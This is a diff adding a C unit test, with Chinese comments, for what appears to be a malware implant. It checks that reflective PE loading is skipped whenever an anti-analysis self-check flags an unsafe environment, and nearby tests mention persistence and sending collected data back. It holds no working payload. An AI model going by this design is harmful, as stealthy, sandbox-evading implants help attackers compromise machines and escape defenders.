@@ -303,6 +303,69 @@ static void t_no_persist_config(void)
     CHECK(r.batches >= 1, "未配置驻留时仍完成采集回传");
 }
 
+static int g_rr_calls;
+
+static int rr_protect_never(void *ud, uint8_t *addr, size_t len, int prot)
+{ (void)ud; (void)addr; (void)len; (void)prot; g_rr_calls++; return 0; }
+
+static int rr_call_never(void *ud, uint64_t va, uint64_t a1, uint64_t a2,
+                         uint64_t a3, uint64_t *ret)
+{ (void)ud; (void)va; (void)a1; (void)a2; (void)a3; if (ret) *ret = 1;
+  g_rr_calls++; return 0; }
+
+static int rr_resolve_never(const char *dll, const char *func, uint16_t ord,
+                            int by_ord, void *ud, uint64_t *out)
+{ (void)dll; (void)func; (void)ord; (void)by_ord; (void)ud;
+  if (out) *out = 0x1000u; g_rr_calls++; return LD_OK; }
+
+/*
+ * 反射落地必须同样受对抗自检闸门约束：装载会在目标机上产生权限切换与
+ * 代码执行痕迹，在不安全环境里做这一步，比什么都不做暴露得多。
+ */
+static void t_reflect_unsafe_gate(void)
+{
+    imw_cfg_t c; hooks_t h; imw_hooks_t hk;
+    imw_result_t r;
+    uint8_t region[4096];
+    uint8_t pe[64];
+    rr_hooks_t rh;
+    int rc;
+
+    memset(&h, 0, sizeof(h));
+    memset(&rh, 0, sizeof(rh));
+    memset(region, 0, sizeof(region));
+    memset(pe, 0xAA, sizeof(pe));
+    g_rr_calls = 0;
+
+    cfg_default(&c, &h);
+    h.defend_rc = -6;                 /* DW_ERR_UNSAFE */
+    hooks_bind(&hk, &h);
+
+    /* 反射层回调刻意给非空指针：若自检没有先于装载执行，这里必然被调用 */
+    rh.protect = rr_protect_never;
+    rh.call    = rr_call_never;
+    rh.resolve = rr_resolve_never;
+
+    rc = imw_reflect_run(&c, &hk, &rh, pe, sizeof(pe), region, sizeof(region), &r);
+
+    CHECK(rc == IMW_ERR_UNSAFE, "反射落地在不安全环境返回 IMW_ERR_UNSAFE");
+    CHECK(h.defend_calls == 1, "反射落地前对抗自检被调用一次");
+    CHECK(g_rr_calls == 0, "不安全时反射层回调一次都没被调用");
+    CHECK(r.n_reloc == 0 && r.entry_invoked == 0, "不安全时无任何装载/执行记录");
+    {
+        int untouched = 1;
+        size_t i;
+        for (i = 0; i < sizeof(region); i++) if (region[i] != 0) { untouched = 0; break; }
+        CHECK(untouched, "不安全时 region 一个字节都没被写");
+    }
+
+    h.defend_rc = 0;                  /* 转安全，仅验参数门 */
+    rc = imw_reflect_run(&c, &hk, &rh, pe, sizeof(pe), NULL, sizeof(region), &r);
+    CHECK(rc == IMW_ERR_PARAM, "反射落地 NULL region -> PARAM");
+    rc = imw_reflect_run(&c, &hk, NULL, pe, sizeof(pe), region, sizeof(region), &r);
+    CHECK(rc == IMW_ERR_PARAM, "反射落地 NULL 反射回调 -> PARAM");
+}
+
 static void t_errstr(void)
 {
     CHECK(strcmp(imw_errstr(IMW_ERR_UNSAFE), "environment unsafe (no action taken)") == 0,
@@ -329,6 +392,7 @@ int main(void)
     t_bootstrap_only_persists();
     t_bootstrap_unsafe_skips_persist();
     t_no_persist_config();
+    t_reflect_unsafe_gate();
     t_errstr();
 
     printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
